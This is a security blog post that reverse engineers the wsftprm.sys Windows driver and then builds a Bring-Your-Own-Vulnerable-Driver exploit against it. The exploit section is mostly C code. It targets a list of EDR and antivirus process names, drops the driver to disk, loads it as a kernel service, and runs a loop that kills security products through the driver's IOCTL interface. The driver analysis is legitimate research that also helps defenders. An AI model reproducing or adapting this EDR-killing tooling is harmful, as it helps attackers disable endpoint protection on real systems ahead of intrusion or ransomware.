---
title: "Exploring the Kernel-Mode attack surface: Reverse engineering a vulnerable Driver abused to terminate EDRs"
date: 2026-03-02
categories: [Exploit]
tags: [C, Exploit, Reverse Engineering, WinAPI, Windows, Driver, EDR]
image: "assets/persistencia/edr is listening.jpg"
---

⚠️ **Disclaimer | Educational Purpose Only**
>
> This content is provided **strictly for educational and research purposes**.
>  
> All techniques, concepts, and examples discussed in this post are intended to support the study of **information security, malware analysis, and defensive research** in controlled and legal environments.
>
> The author does **not encourage, support, or condone** the use of this material for malicious, illegal, or unethical activities.
>
> Any actions taken based on the information presented here are the **sole responsibility of the reader**.
>
> Always ensure that your research and experiments comply with **local laws, ethical guidelines, and institutional policies**.

## Introduction 
Hello, in this post I will cover a topic I am deeply interested in: driver exploitation. I will demonstrate the exploitation of the wsftprm.sys driver, walking through the reverse engineering process to understand its internal behavior, and later developing an exploit. I want to make it clear from the beginning that this vulnerability was originally discovered by the researchers at Northwave, and full credit goes to them. The link to their original research is available in the references section of this post.

To begin, it is important to understand that the Windows operating system is built on a privilege separation architecture, where components running in kernel mode have unrestricted control over critical system resources. Within this context, device drivers represent one of the most sensitive attack surfaces, as they operate in Ring 0 and integrate directly with internal kernel structures. 

![alt image](/assets/driver/rings.png)

Drivers are frequently perceived as trustworthy components within the Windows ecosystem. However, when they contain validation or memory control flaws, they become privileged vectors for kernel-mode exploitation.

## Reverse Engineering – Understanding the Driver
Right from the beginning, we should pay attention to our driver’s import table to understand some of the APIs that are being called:
![alt image](/assets/driver/imports.png)

What stands out the most, and we will discover why it is so valuable, are the APIs [ZwOpenProcess](https://learn.microsoft.com/pt-br/windows-hardware/drivers/ddi/ntddk/nf-ntddk-zwopenprocess) and [ZwTerminateProcess](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-zwterminateprocess). Let’s understand these two APIs in more detail:

### ZwOpenProcess 
```c
NTSYSAPI NTSTATUS ZwOpenProcess(
  [out]          PHANDLE            ProcessHandle,
  [in]           ACCESS_MASK        DesiredAccess,
  [in]           POBJECT_ATTRIBUTES ObjectAttributes,
  [in, optional] PCLIENT_ID         ClientId
);
```
When we read about this API in the documentation, we understand that it is responsible for opening a handle to an existing process. It receives the PID (via CLIENT_ID) and the desired access rights, then the kernel validates whether the caller has permission to access that process. If authorized, a handle is created in the caller’s handle table, thereby enabling subsequent operations such as memory reading, writing, or process termination, depending on the granted permissions.

### ZwTerminateProcess 
```c
NTSYSAPI NTSTATUS ZwTerminateProcess(
  [in, optional] HANDLE   ProcessHandle,
  [in]           NTSTATUS ExitStatus
);
```
By reading the documentation, it is possible to understand that this API is used to terminate a process from a valid handle that possesses the PROCESS_TERMINATE right. After access verification, the kernel initiates the process termination, finalizing its threads and releasing resources.

### DriverEntry and the exposure of the device to user mode
```c
__int64 __fastcall sub_140001150(PDRIVER_OBJECT DriverObject, __int64 a2)
{
  NTSTATUS v4; // edi
  const WCHAR *v5; // rbp
  __int64 v6; // rax
  const WCHAR *v7; // rsi
  _UNICODE_STRING DestinationString; // [rsp+40h] [rbp-38h] BYREF
  struct _UNICODE_STRING SymbolicLinkName; // [rsp+50h] [rbp-28h] BYREF
  const WCHAR *v11; // [rsp+80h] [rbp+8h] BYREF
  __int64 v12; // [rsp+90h] [rbp+18h] BYREF

  DriverObject->DriverUnload = (PDRIVER_UNLOAD)sub_140001350;
  v4 = -1073741823;
  if ( (unsigned int)sub_140001D00(a2) < 3 )
  {
    sub_140001E14(a2);
    sub_140002970();
    qword_1400054D0 = sub_14000259C(*(unsigned __int16 *)(a2 + 2));
    if ( qword_1400054D0 )
    {
      LOWORD(dword_1400054C8) = 0;
      HIWORD(dword_1400054C8) = *(_WORD *)(a2 + 2);
      if ( (unsigned int)sub_140001A78(&dword_1400054C8, a2) )
      {
        dword_1400054C8 = 0;
        sub_1400025FC(qword_1400054D0);
        qword_1400054D0 = 0;
      }
    }
    v5 = (const WCHAR *)sub_1400014AC();
    v11 = v5;
    v6 = sub_140001410();
    v12 = v6;
    v7 = (const WCHAR *)v6;
    if ( v5 && v6 )
    {
      RtlInitUnicodeString(&DestinationString, v5);
      RtlInitUnicodeString(&SymbolicLinkName, v7);
      if ( IoCreateDevice(DriverObject, 0, &DestinationString, 0x22u, 0x100u, 0, &DeviceObject) >= 0 )
      {
        sub_1400010F0();
        sub_1400024C8();
        memset64(DriverObject->MajorFunction, (unsigned __int64)&sub_140001BD0, 0x1Bu);
        DriverObject->MajorFunction[0] = (PDRIVER_DISPATCH)&sub_1400013F0;
        DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)sub_140001540;
        DriverObject->MajorFunction[2] = (PDRIVER_DISPATCH)&sub_140001B70;
        DriverObject->MajorFunction[18] = (PDRIVER_DISPATCH)&sub_1400013F0;
        if ( !IoRegisterShutdownNotification(DeviceObject) )
          DriverObject->MajorFunction[16] = (PDRIVER_DISPATCH)&sub_140001BA0;
        DeviceObject->Flags &= ~0x80u;
        v4 = IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
        if ( v4 < 0 )
        {
          IoDeleteDevice(DeviceObject);
          DeviceObject = 0;
        }
      }
      sub_1400019D4(&v11);
      sub_140001998(&v12);
    }
  }
  return (unsigned int)v4;
}
```
By analyzing this function, we understand that it defines the DriverUnload callback:
```c
DriverObject->DriverUnload = sub_140001350;
```
It creates a device object through IoCreateDevice, registers dispatch routines in the MajorFunction table, configures the system shutdown notification, and creates a symbolic link to expose the device to user mode. At a superficial level, nothing appears explicitly wrong in this logic. However, the security implications begin to emerge when we take a closer look at how this device is created. The driver uses IoCreateDevice directly and does not make use of IoCreateDeviceSecure. This means that the device object may inherit default system permissions, potentially allowing user-mode processes to open a handle to it. If the device is accessible via [CreateFile](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea), any process can communicate with the driver through DeviceIoControl.
Another relevant point is the registration of a handler for IRP_MJ_DEVICE_CONTROL, which clearly indicates that the driver processes IOCTL requests coming from user mode. If these IOCTL routines forward user-controlled data directly into sensitive kernel functions without strict validation, the driver effectively acts as a privileged intermediary.

### sub_140001540
Following the execution flow, we reach sub_140001540. This function clearly corresponds to the IRP_MJ_DEVICE_CONTROL handler, meaning it is responsible for processing IOCTL requests sent from user mode via DeviceIoControl.
At the beginning of the routine, it retrieves the SystemBuffer from the IRP (*(_DWORD **)(a2 + 184)), which strongly suggests that the driver is using METHOD_BUFFERED. In this transfer method, the data supplied by the user is copied into a kernel-allocated buffer before being processed. The driver then interprets this buffer directly in kernel mode. Considering that the driver imports ZwOpenProcess and ZwTerminateProcess, it becomes plausible that certain IOCTL codes allow direct process manipulation based on user-controlled parameters. Since the device is exposed to user mode without strong access restrictions, this design can effectively turn the driver into a privileged proxy, enabling sensitive process operations from kernel context on behalf of user-mode callers.

## Building an exploit
Based on the driver analysis, we can build an exploit that leverages what we have identified. The developed code implements the BYOVD (Bring Your Own Vulnerable Driver) technique, which consists of providing our own vulnerable driver, loading it into the system, and then using its functionalities to kill EDR processes in a privileged manner.
For the exploit to be effective, we need to identify which security processes are running. For this, we use an extensive list of executable names from EDR and antivirus solutions, including components from Microsoft Defender to solutions from CrowdStrike, SentinelOne, Carbon Black, and Elastic. This list will be used to compare with the processes running on the system.
```c
static const WCHAR* g_EDRProcesses[] = {
    L"MsMpEng.exe", L"NisSrv.exe", L"CSFalconService.exe", ...
};
```

The WriteDriverToDisk function checks if the file already exists and removes it, creates a new file with CreateFileW using the CREATE_NEW flag and FILE_FLAG_WRITE_THROUGH to ensure direct writing, and then writes the driver binary with WriteFile. The full path is generated by the GenerateDriverPath function, which obtains the Windows directory and concatenates it with the drivers path and the file name.
```c
static BOOL WriteDriverToDisk(LPCWSTR filePath, const unsigned char* driverData, DWORD dataSize) {
    if (GetFileAttributesW(filePath) != INVALID_FILE_ATTRIBUTES) DeleteFileW(filePath);
    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, NULL);
    WriteFile(hFile, driverData, dataSize, &bytesWritten, NULL);
}
```
With the driver on disk, the exploit needs to load it as a kernel service. The LoadDriverAsService function opens the Service Control Manager with OpenSCManagerW and attempts to create a new service of type SERVICE_KERNEL_DRIVER with CreateServiceW. If the service already exists, it is opened with OpenServiceW. Then, StartServiceW is called to start the driver, effectively loading it into kernel memory with maximum privileges.
```c
static BOOL LoadDriverAsService(LPCWSTR serviceName, LPCWSTR driverPath) {
    SC_HANDLE hSCM = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE hService = CreateServiceW(hSCM, serviceName, serviceName, SERVICE_START | DELETE | SERVICE_STOP,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, driverPath, NULL, NULL, NULL, NULL, NULL);
    StartServiceW(hService, 0, NULL);
}
```
After the driver is running, we need a handle to the exposed device. The OpenDriverDevice function uses CreateFileW with the defined symbolic link, requesting read and write access, which will allow us to send IOCTLs.
The main killing loop is implemented in the KillEDRLoop function. It continuously executes: enumerates the current EDR processes, kills each one using KillProcessViaDriver, and then waits for an interval before repeating. This is necessary because some EDRs may have child processes that attempt to restart killed components, or may have multiple components that need to be eliminated.
```c
static BOOL KillEDRLoop(HANDLE hDevice) {
    while (running) {
        EnumerateEDRProcesses(&processList, &processCount);
        for (DWORD i = 0; i < processCount; i++) {
            KillProcessViaDriver(hDevice, processList[i].dwPid);
        }
        if (_kbhit() && _getch() == 'q') break;
        Sleep(SLEEP_TIME_MS);
    }
}
```
### Result (PoC)
<iframe width="560" height="315" src="https://www.youtube.com/embed/z1ACCEy47LE" 
title="YouTube video" frameborder="0" allowfullscreen></iframe>